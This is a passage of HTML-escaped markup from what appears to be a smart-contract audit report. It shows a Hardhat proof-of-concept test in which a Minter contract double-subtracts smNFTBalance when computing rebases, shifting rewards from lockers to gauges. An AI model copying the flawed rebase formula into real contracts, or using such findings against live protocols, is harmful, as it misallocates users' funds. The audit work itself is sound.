false /* isSMNFT */);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceToNextMintingPeriod(minter);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const veTotal = await blackToken.balanceOf(votingEscrow.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blackTotal = await blackToken.totalSupply();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTBalance = await votingEscrow.smNFTBalance();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const superMassiveBonus = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const weeklyEmission = await minter.weekly();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Test Case: smNFTBalance is ZERO ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  veTotal:\u0026quot;, formatBN(veTotal));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  blackTotal:\u0026quot;, formatBN(blackTotal));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smNFTBalance:\u0026quot;, formatBN(smNFTBalance)); // Should be 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  superMassiveBonus:\u0026quot;, formatBN(superMassiveBonus)); // Should be 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Weekly Mint:\u0026quot;, formatBN(weeklyEmission));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rebaseContract = await minter.calculate_rebase(weeklyEmission);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Rebase (Contract):\u0026quot;, formatBN(rebaseContract));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected calculation (should match contract when smNFTBalance is 0)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Contract\u0026#39;s circulatingBlack = blackTotal - veTotal - smNFTBalance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected circulatingBlack = blackTotal - veTotal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Since smNFTBalance is 0, these are the same.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const correctedCirculating = blackTotal.sub(veTotal);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const correctedDenominator = blackTotal.add(superMassiveBonus); // bonus is 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let correctedRebase = ethers.BigNumber.from(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!correctedDenominator.isZero() \u0026amp;\u0026amp; correctedCirculating.gte(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const numSq = correctedCirculating.mul(correctedCirculating);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const denSqTimes2 = correctedDenominator.mul(correctedDenominator).mul(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if(!denSqTimes2.isZero()) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                correctedRebase = weeklyEmission.mul(numSq).div(denSqTimes2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Rebase (Corrected):\u0026quot;, formatBN(correctedRebase));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(smNFTBalance).to.equal(0, \u0026quot;smNFTBalance should be zero for this test case\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const diff = rebaseContract.sub(correctedRebase).abs();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Allow for extremely small dust if any fixed point math slightly differs, though should be equal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const tolerance = ethers.utils.parseUnits(\u0026quot;1\u0026quot;, \u0026quot;wei\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(diff).to.be.lte(tolerance, \u0026quot;Rebase calculations should be identical when smNFTBalance is zero\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;should demonstrate rebase miscalculation when smNFTBalance is positive\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await setupContracts(); // Ensure fresh state for this test\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockAmount = ethers.utils.parseEther(\u0026quot;10000\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTLockAmount = ethers.utils.parseEther(\u0026quot;50000\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockDuration = WEEK * 52 * 1; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(user1).create_lock(smNFTLockAmount, lockDuration, true /* isSMNFT */);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceToNextMintingPeriod(minter);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const veTotal_before = await blackToken.balanceOf(votingEscrow.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blackTotal_before = await blackToken.totalSupply(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTBalance_before = await votingEscrow.smNFTBalance(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const superMassiveBonus_before = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance_before);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const weeklyEmission_for_period = await minter.weekly(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Test Case: smNFTBalance is POSITIVE ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;State BEFORE Minter.update_period / calculate_rebase (Revised Inputs):\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  veTotal (tokens in VE for normal/perm locks):\u0026quot;, formatBN(veTotal_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  blackTotal (actual totalSupply after smNFT burn):\u0026quot;, formatBN(blackTotal_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smNFTBalance (sum of original principals burned for smNFTs):\u0026quot;, formatBN(smNFTBalance_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  superMassiveBonus (conceptual bonus on smNFTBalance):\u0026quot;, formatBN(superMassiveBonus_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Weekly Mint for this period (emission to be distributed):\u0026quot;, formatBN(weeklyEmission_for_period));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rebaseAmount_from_contract_calc = await minter.calculate_rebase(weeklyEmission_for_period);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Rebase Amount calculated BY CONTRACT\u0026#39;S LOGIC:\u0026quot;, formatBN(rebaseAmount_from_contract_calc));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected Logic: circulatingBlack should NOT double-subtract smNFTBalance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const corrected_circulatingBlack = blackTotal_before.sub(veTotal_before); // Numerator: BT - VT\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected Denominator: actual total supply + conceptual bonus\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const corrected_blackSupply_denominator = blackTotal_before.add(superMassiveBonus_before); // Denominator: BT + B\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\nFor Manual/Corrected Calculation:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Corrected Circulating Black (ActualCirculating):\u0026quot;, formatBN(corrected_circulatingBlack));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Corrected Black Supply Denominator (ActualTotalSupply + Bonus):\u0026quot;, formatBN(corrected_blackSupply_denominator));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let corrected_rebaseAmount = ethers.BigNumber.from(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!corrected_blackSupply_denominator.isZero() \u0026amp;\u0026amp; corrected_circulatingBlack.gte(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const num_squared = corrected_circulatingBlack.mul(corrected_circulatingBlack);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const den_squared_times_2 = corrected_blackSupply_denominator.mul(corrected_blackSupply_denominator).mul(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (!den_squared_times_2.isZero()) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 corrected_rebaseAmount = weeklyEmission_for_period.mul(num_squared).div(den_squared_times_2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Rebase Amount calculated MANUALLY (Corrected Logic):\u0026quot;, formatBN(corrected_rebaseAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const expected_misallocated_rebase = corrected_rebaseAmount.sub(rebaseAmount_from_contract_calc);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Expected Misallocated Rebase (Corrected - Contract):\u0026quot;, formatBN(expected_misallocated_rebase));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // --- Assertions for Vulnerable Outcome ---\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(smNFTBalance_before).to.be.gt(0, \u0026quot;Test setup failed: smNFTBalance should be positive for this test case\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(rebaseAmount_from_contract_calc).to.be.lt(corrected_rebaseAmount, \u0026quot;Contract\u0026#39;s rebase should be less than corrected rebase when smNFTs exist\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(expected_misallocated_rebase).to.be.gt(0, \u0026quot;Expected misallocated rebase amount should be greater than zero\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // --- Demonstrate Upstream Impact on State ---\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rewardsDistributor_bal_before_mint = await blackToken.balanceOf(rewardsDistributorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const minterTeamAddress = await minter.team();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const team_bal_before_mint = await blackToken.balanceOf(minterTeamAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeManager_allowance_before_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Calculate expected team and gauge amounts based on BOTH contract\u0026#39;s flawed rebase AND corrected rebase\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const teamRate = await minter.teamRate();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MAX_BPS = await minter.MAX_BPS();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const teamEmission_contract = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeEmission_contract = weeklyEmission_for_period.sub(rebaseAmount_from_contract_calc).sub(teamEmission_contract);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const teamEmission_corrected = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS); // team emission is same\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeEmission_corrected = weeklyEmission_for_period.sub(corrected_rebaseAmount).sub(teamEmission_corrected);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Predicted Distribution (based on contract\u0026#39;s flawed rebase) ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Rebase to Distributor:\u0026quot;, formatBN(rebaseAmount_from_contract_calc));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Team:\u0026quot;, formatBN(teamEmission_contract));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Gauges:\u0026quot;, formatBN(gaugeEmission_contract));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Predicted Distribution (based on CORRECTED rebase) ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Rebase to Distributor (Corrected):\u0026quot;, formatBN(corrected_rebaseAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Team (Corrected):\u0026quot;, formatBN(teamEmission_corrected));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Gauges (Corrected):\u0026quot;, formatBN(gaugeEmission_corrected));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Execute the minting period update\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.connect(deployer).update_period(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rewardsDistributor_bal_after_mint = await blackToken.balanceOf(rewardsDistributorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const team_bal_after_mint = await blackToken.balanceOf(minterTeamAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeManager_allowance_after_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rebase_actually_paid = rewardsDistributor_bal_after_mint.sub(rewardsDistributor_bal_before_mint);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const team_actually_paid = team_bal_after_mint.sub(team_bal_before_mint);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gauge_actually_approved = gaugeManager_allowance_after_mint.sub(gaugeManager_allowance_before_mint); // Assuming allowance starts at 0 or reset\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Actual Distribution After Minter.update_period() ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Actual Rebase Paid to RewardsDistributor:\u0026quot;, formatBN(rebase_actually_paid));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Actual Emission Paid to Team:\u0026quot;, formatBN(team_actually_paid));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Actual Emission Approved for GaugeManager:\u0026quot;, formatBN(gauge_actually_approved));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Assert that actual payments match the contract\u0026#39;s flawed calculations\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(rebase_actually_paid).to.equal(rebaseAmount_from_contract_calc, \u0026quot;Actual rebase paid should match contract\u0026#39;s flawed calculation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(team_actually_paid).to.equal(teamEmission_contract, \u0026quot;Actual team emission should match contract\u0026#39;s calculation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(gauge_actually_approved).to.equal(gaugeEmission_contract, \u0026quot;Actual gauge approval should match contract\u0026#39;s calculation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Assert that gauge emission is higher than it should be\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(gauge_actually_approved).to.be.gt(gaugeEmission_corrected, \u0026quot;Gauge emission is higher than it should be due to understated rebase\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const excessToGauges = gauge_actually_approved.sub(gaugeEmission_corrected);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(excessToGauges).to.equal(expected_misallocated_rebase, \u0026quot;Excess to gauges should equal the rebase misallocation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003econtracts/mocks/GaugeManagerMock.sol\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan 